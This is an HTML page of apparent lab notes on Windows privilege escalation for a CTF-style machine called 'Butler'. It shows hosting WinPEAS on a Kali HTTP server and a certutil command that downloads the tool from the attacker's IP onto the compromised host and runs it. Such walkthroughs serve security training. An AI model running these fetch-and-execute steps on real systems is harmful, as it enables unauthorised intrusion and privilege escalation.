@@ -1,0 +1,34 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Privilege Escalation</title>
+</head><body>As you can see we are Butler in Butler and not Admin so will see how to escalate the Privileges here.<br/>
+So when we type Systeminfo we got to know the build (i.e. Windows 10 enterprise) which as very low changes of having exploit<br/>
+So will do basic enumeration here and if curious about this do join <b>windows privilege escalation course.<br/>
+</b><br/>
+There is a tool called Winpeas just like Linpeas <br/>
+Will download the winpeasx64 : <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221211 ">https://github.com/carlospolop/PEASS-ng/releases/tag/20221211<br/>
+</a><br/>
+Kali Linux<br/>
+After downloading will rename the file and than store it in the transfer folder.<br/>
+Command: mv /home/kali/Downloads/winpeas.exe ~/transfer/winpeas.exe<br/>
+<br/>
+And then will host the server so that we can download the file on the shell and can execute from there.<br/>
+python3 -m http.server 80<br/>
+<br/>
+Remember that we can't use wget to download the file like Linux<br/>
+<br/>
+Shell :<br/>
+cd c:\users<br/>
+dir<br/>
+cd butler<br/>
+dir<br/>
+<br/>
+Will see the timing of the file at which time the particular file was modified so that will help when we are doing CTFs.<br/>
+Will use the certutil command <br/>
+certutil.exe -urlcache -f http://192.168.205.128/winpeas.exe winpeas.exe<br/>
+dir<br/>
+winpeas.exe<br/>
+<br/>
+<br/>
+</body></html>
